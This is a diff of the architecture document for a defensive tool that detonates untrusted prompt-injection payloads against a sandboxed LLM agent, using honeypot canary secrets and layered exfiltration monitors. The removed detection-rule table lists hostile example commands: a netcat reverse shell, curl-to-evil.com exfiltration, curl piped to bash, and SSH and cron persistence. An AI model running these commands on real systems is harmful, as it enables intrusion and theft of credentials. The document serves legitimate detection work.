@@ -1,236 +1,87 @@
 # Architecture
 
-Detonation Tool is a prompt injection detection system that runs untrusted payloads
-through a real LLM agent in a honeypot sandbox and monitors for exfiltration attempts
-across multiple independent detection layers.
-
-## High-Level Design
-
 ```
-┌─────────────────────────────────────────────────────────────┐
-│                     detonate CLI                             │
-│                                                             │
-│  Payload ──► PiAgent.detonate() ──► JSON Report ──► stdout │
-│                      │                                      │
-│              ┌───────┴──────────┐                           │
-│              │   Sandbox Setup  │                           │
-│              │   /tmp/daas-*   │                           │
-│              └─────────────────┘                           │
-└─────────────────────────────────────────────────────────────┘
-```
-
-The tool is a **standalone binary** with no server component. It:
-
-1. Generates cryptographically random honeypot credentials ("canaries")
-2. Writes them to a real filesystem sandbox at `/tmp/daas-sandbox-<uuid>/`
-3. Starts a network canary HTTP server on a random port
-4. Spawns a real `pi` subprocess with bash/read/write/edit tools in the sandbox
-5. Feeds the untrusted payload as the agent's instruction
-6. Parses Pi's JSONL output stream in real-time
-7. Runs all detection layers against every tool call and text output
-8. Kills the Pi process, cleans up the sandbox, outputs the report
-
-## Core Data Flow
-
-```
-                ┌──────────────────┐
-                │  CanaryGenerator │──► 8 honeypot credentials
-                └──────────────────┘
-                         │
-                         ▼
-                ┌──────────────────┐
-                │ HoneypotBuilder  │──► ~/.aws/credentials, ~/.env, etc.
-                └──────────────────┘
-                         │
-                         ▼
-                ┌──────────────────┐
-                │  NetworkCanary   │──► HTTP server on random port
-                │  (HTTP server)   │    URL planted in .env as WEBHOOK_URL
-                └──────────────────┘
-                         │
-                         ▼
-                ┌──────────────────┐
-                │    PiAgent       │──► Spawns `pi --mode json ...`
-                │  (subprocess)    │    Real bash, read, write, edit tools
-                └──────────────────┘
-                         │
-              ┌──────────┼──────────┐
-              ▼          ▼          ▼
-        ┌─────────┐ ┌─────────┐ ┌─────────┐
-        │ Layer 1 │ │ Layer 2 │ │ Layer 3 │
-        │ Canary  │ │Behavior │ │ Traffic │
-        │ Monitor │ │Analyzer │ │ Capture │
-        └─────────┘ └─────────┘ └─────────┘
-              │          │          │
-              ▼          ▼          ▼
-        ┌─────────────────────────────────────┐
-        │        ReportBuilder                │
-        │  (multi-layer verdict + confidence)  │
-        └─────────────────────────────────────┘
-                         │
-                         ▼
-                ┌──────────────────┐
-                │   JSON Report    │──► stdout + exit code
-                └──────────────────┘
+detonation-chamber/
+├── src/main.rs            CLI (`detonate`): flags, .env, provider resolution, output, exit codes
+├── daas/                  Library (+ an optional HTTP server binary, `daas`)
+│   └── src/
+│       ├── pi_agent.rs    Engine: sandbox setup, run Pi, parse events, analyze_events()
+│       ├── sandbox.rs     bubblewrap command builder, Pi/Node resolution
+│       ├── proxy.rs       Credential-isolating LLM proxy (127.0.0.1)
+│       ├── canary.rs      Canary secret generation
+│       ├── honeypot.rs    Honeypot filesystem + env layout
+│       ├── monitor.rs     Canary matching (exact / core / fragment / encodings)
+│       ├── behavioral.rs  Behavioral rules + network canary HTTP server
+│       ├── traffic.rs     Traffic extraction + LLM traffic review
+│       ├── agent_review.rs  Agent alarm review (layer 6)
+│       ├── report.rs      Verdict policy + report building
+│       └── types.rs       Shared types (report JSON schema)
+├── pi-extension/          Pi extension registering a `detonate` tool
+├── SKILL.md               Pi skill
+└── evals/                 Labeled dataset + runner
 ```
 
-## Detection Layers
+## One detonation, step by step
 
-### Layer 1: CanaryMonitor
+1. **CLI** (`src/main.rs`) loads `.env`, resolves provider/model/key/base URL, verifies
+   `bwrap` works, starts the **network canary** (random 127.0.0.1 port), and builds a `PiAgent`.
+2. **Honeypot** (`PiAgent::create_sandbox`): a fresh `$TMPDIR/daas-sandbox-<uuid>/home/agent`
+   (mode 0700) with canaries in `.env`, `.aws/credentials`, `.ssh/id_ed25519`, `config/app.conf`,
+   `secrets/*`, the canary URL in `config/webhooks.yml` and `.env`, and decoy files. With task
+   framing the payload is written to `~/inbox/message.md`.
+3. **LLM proxy** (`proxy.rs`): started on 127.0.0.1. Pi's sandboxed config
+   (written outside the honeypot home and mounted at `/run/agent/pi`, `PI_CODING_AGENT_DIR`) defines
+   one provider `gateway` → proxy, model id `target`, and a placeholder key. The proxy rewrites `model`, adds `Authorization`, forwards to the upstream
+   (`https://openrouter.ai/api/v1` by default) and streams the response back.
+4. **Pi under bubblewrap** (`sandbox.rs`):
+   `bwrap --ro-bind / / --dev /dev --proc /proc --tmpfs {/home,/root,/media,/mnt,/run,/tmp,…}
+   --ro-bind <node prefix> --ro-bind <pi node_modules> --ro-bind <fake passwd/group> /etc/{passwd,group}
+   --bind <pi config> /run/agent/pi --bind <honeypot> /home/agent
+   --unshare-pid --unshare-ipc --unshare-uts --die-with-parent --new-session --clearenv --setenv …
+   -- node <pi cli.js> --mode json --print --no-session --no-extensions --no-skills
+   --no-context-files --offline --provider gateway --model target --tools read,bash,edit,write
+   [--append-system-prompt <trusting persona>] <prompt>`.
+   The environment contains only `HOME=/home/agent`, `PATH`, locale, and the honeypot variables.
+5. **Event loop**: Pi's JSONL is parsed line by line (`parse_pi_line`): `tool_execution_start`,
+   `tool_execution_end`, `turn_start`, and assistant `message_end` (text, thinking, usage, errors).
+   The run is killed on timeout or when turns exceed `--max-turns`.
+6. **Analysis** (`analyze_events`, pure and unit-tested) runs layers 1, 3, and 4. Then the engine adds
+   network-canary hits (layer 2), the traffic review (layer 5, only if there was traffic), and the
+   agent alarm review (layer 6).
+7. **Report** (`ReportBuilder::from_pi_result`) applies the verdict policy (see
+   [DETECTION_LAYERS.md](DETECTION_LAYERS.md)) and the CLI prints JSON/human output and exits 0–3.
+   The sandbox directory is deleted unless `--keep-sandbox`.
 
-**What it catches:** Canary values appearing in LLM text output or tool call arguments.
+## Trust boundaries
 
-**Matching strategies:**
-- **Exact match**: `text.contains(&canary.value)` — catches verbatim regurgitation
-- **Fuzzy prefix match**: First N characters of a canary appearing in text (e.g., `AKIAIOSFODN...`)
-- **Fuzzy suffix match**: Last N characters of a canary appearing in text
+| Asset | Where it lives | Reachable by the agent? |
+|---|---|---|
+| Your files (`/home`, `/media`, `/mnt`, …) | host | No (tmpfs over them) |
+| Provider API key | `detonate` process env | No: separate PID namespace, cleared env, proxy adds it |
+| Canary secrets | honeypot home + agent env | Yes, by design |
+| Network | bwrap: shared with host. firecracker: none (vsock tunnels to proxy + canary only) | bwrap: yes. firecracker: no |
+| Pi + Node install | host, read-only bind | Read-only |
 
-**Severity classification:**
-- Canary in outbound tool (`curl`, `send_email`, `http_post`) → **Critical** (confirmed exfiltration)
-- Canary in bidirectional tool (`write_file`) → **Medium** (suspicious)
-- Canary in inbound tool (`read_file`) → **Info** (expected — LLM is supposed to read secrets)
+## Firecracker backend (`firecracker.rs`, `vm/`)
 
-### Layer 2: BehavioralAnalyzer
-
-**What it catches:** Suspicious bash command patterns, even without canary values.
-
-**Detection rules** (10+ types):
-| Pattern | Example | Severity |
-|---------|---------|----------|
-| Reverse shell | `nc -e /bin/bash 1.2.3.4 4443` | **Critical** |
-| Outbound network | `curl https://evil.com` | **High** |
-| Crypto transaction | `cast send --private-key 0x... --to 0x...` | **Critical** |
-| Obfuscated command | `echo 'base64...' \| base64 -d \| bash` | **High** |
-| SSH persistence | `echo 'key' >> ~/.ssh/authorized_keys` | **Critical** |
-| Cron persistence | `(crontab -l; echo '...') \| crontab -` | **Critical** |
-| Remote script exec | `curl https://evil.com/script.sh \| bash` | **Critical** |
-| External API call | `curl https://api.stripe.com/...` | **Critical** |
-| Git config manipulation | `git remote add malicious ...` | **High** |
-| Shell profile modification | `echo 'export ...' >> ~/.bashrc` | **High** |
-| CI/CD manipulation | Writing to `.github/workflows/` | **Critical** |
-
-**Sequence analysis:** Detects patterns across multiple tool calls:
-- Read `.aws/credentials` → `curl https://evil.com` → **Critical** (exfiltration pattern)
-- Read `.env` → `cast send --private-key` → **Critical** (theft pattern)
-
-### Layer 3: TrafficCapture
-
-**What it catches:** Network-related commands extracted from bash tool calls.
-
-**Parsed protocols:**
-- HTTP/HTTPS (curl, wget)
-- TCP/UDP (nc, ncat)
-- SSH/SCP
-- DNS (dig, nslookup, host)
-- HTTP via scripting (python requests, node fetch)
-- Blockchain RPC (cast, forge, solana)
-
-**Expected destination filtering:** Traffic to known APIs (OpenAI, Anthropic, Ollama, etc.)
-and localhost are filtered out. Everything else is flagged as unexpected.
-
-### Layer 4: NetworkCanary
-
-**What it catches:** Any HTTP request the test agent makes to a monitored endpoint.
-
-**How it works:**
-1. A real HTTP server starts on `127.0.0.1:<random-port>` before the test Pi runs
-2. The canary URL is planted in the honeypot as `WEBHOOK_URL` in `.env` and in `config/webhooks.yml`
-3. If the test Pi makes ANY HTTP request to this URL, it's caught with full request details
-4. Every hit generates a **Critical** severity exfiltration event
-
-**What's captured per hit:**
-- HTTP method (GET, POST, etc.)
-- Request path
-- Headers (custom headers that might encode stolen data)
-- Request body
-- Source IP and port
-- Exact timestamp
-
-### Layer 5: TrafficReviewer (LLM-based)
-
-**What it catches:** Subtle exfiltration patterns that regex can't detect.
-
-**How it works:**
-1. After the test Pi finishes, the traffic log is sent to a **separate LLM call**
-2. The LLM (configured via `DAAS_TRAFFIC_REVIEW_MODEL`) analyzes the traffic for:
-   - DNS exfiltration (data encoded in subdomain queries)
-   - HTTP headers with suspicious custom fields
-   - Webhook calls forwarding stolen data
-   - Crypto RPC connections
-   - Base64/hex encoded payloads
-   - Split exfiltration across multiple small requests
-3. Falls back to rule-based analysis if the LLM call fails
-
-## Report Building
-
-The `ReportBuilder::from_pi_result()` function produces a `DetonationReport`:
-
-```rust
-pub struct DetonationReport {
-    pub verdict: Verdict,              // Safe | Suspicious | Malicious | Error
-    pub confidence: f32,               // 0.0 to 1.0
-    pub exfiltration_events: Vec<...>, // All confirmed exfil attempts
-    pub behavioral_timeline: Vec<...>, // Chronological event log
-    pub payload_analysis: String,      // Human-readable analysis
-}
-```
-
-**Verdict logic:**
-- `Malicious` if ANY layer confirmed exfiltration (canary in outbound channel, network canary hit, critical traffic review, critical behavioral flag)
-- `Suspicious` if some indicators fire but no confirmed exfil (unexpected traffic, file access, max turns reached)
-- `Safe` if nothing detected across all layers
-
-**Confidence calculation:** Base 50%, +20% for canary exfil, +15% for network canary hit, +15% for critical traffic review, +10% for traffic review findings, +5% for unexpected traffic. Capped at 100%.
-
-## LLM Provider Detection
-
-The tool auto-detects which LLM provider to use for the test agent:
-
-1. **CLI flags** (`--provider`, `--model`) — highest priority
-2. **Environment variables** (`DAAS_LLM_PROVIDER`, `DAAS_LLM_MODEL`, `DAAS_LLM_API_KEY`)
-3. **Auto-detection**:
-   - If `OPENAI_API_KEY` or `ANTHROPIC_API_KEY` is set, use that provider
-   - Default: Ollama at `http://localhost:11434/v1` (no API key needed)
-
-The test agent is a **completely separate Pi process** with its own LLM connection.
-It has no relationship to the calling Pi's model or configuration.
-
-## Exit Codes
-
-| Code | Meaning | Use Case |
-|------|---------|----------|
-| 0 | Safe | Payload is safe to process |
-| 1 | Suspicious | Escalate to human review |
-| 2 | Malicious | Block immediately |
-| 3 | Error | Configuration or runtime error |
-
-## Filesystem Sandbox
-
-The sandbox is created at `/tmp/daas-sandbox-<uuid>/` with this structure:
+With `--firecracker`, steps 4–5 change. Everything else (honeypot, proxy, analysis, report) is shared.
 
 ```
-/tmp/daas-sandbox-<uuid>/
-├── home/agent/
-│   ├── .aws/
-│   │   ├── credentials      # AWS access key + secret key
-│   │   └── config           # AWS region config
-│   ├── .ssh/
-│   │   ├── id_ed25519       # SSH private key (PEM)
-│   │   ├── known_hosts      # GitHub host key
-│   │   └── config            # SSH config
-│   ├── .env                  # Stripe, GitHub, DB, ETH, Slack, API keys
-│   ├── config/
-│   │   ├── app.conf          # Application config with secrets
-│   │   └── webhooks.yml      # Webhook URL (network canary) if enabled
-│   ├── secrets/
-│   │   ├── aws-access-key-id
-│   │   ├── aws-secret-access-key
-│   │   └── eth-wallet-key
-│   ├── README.md             # Innocent workspace readme
-│   ├── .bashrc               # Shell config
-│   ├── .gitconfig            # Git config
-│   └── projects/
-│       └── notes.txt         # Innocent meeting notes
+host                                            microVM (no NIC)
+ detonate ── proxy :P  ◄── unix v.sock_P ◄─vsock─ socat 127.0.0.1:P ◄── Pi (gateway → 127.0.0.1:P)
+          ── canary :C ◄── unix v.sock_C ◄─vsock─ socat 127.0.0.1:C ◄── agent's curl $WEBHOOK_URL
+          ◄── JSONL ─────── unix v.sock_5000 ◄─vsock─ pi … | socat VSOCK-CONNECT:2:5000
+ job.ext4 (mkfs.ext4 -d honeypot/) ───────────────► /dev/vdb → /mnt/job → /home/agent, /run/agent/pi
+ rootfs.ext4 (read-only) ─────────────────────────► / + tmpfs overlay
 ```
 
-The sandbox is cleaned up asynchronously after the detonation completes.
+* `vm/detonate-init` is PID 1: overlay root in RAM, mounts the job disk, binds the honeypot home
+  and Pi config, starts one `socat` tunnel per forwarded port, runs Pi as `agent` with the job's
+  environment, pipes stdout to vsock port 5000, then resets the VM.
+* The host builds the job disk per run, listens on `/tmp/dcfc-<id>/v.sock_<port>` (Firecracker's
+  guest-initiated vsock convention), bridges tunnel connections to `127.0.0.1:<port>`, and reads
+  Pi's stream with the same loop as bubblewrap mode. Timeout / turn limit → VM killed.
+* Pi's stderr is read back from the job disk with `debugfs` for error reporting.
+
+The HTTP server binary (`daas`, `daas/src/main.rs` + `api.rs`/`orchestrator.rs`) wraps the same
+engine behind a REST API and is not covered by the evals.
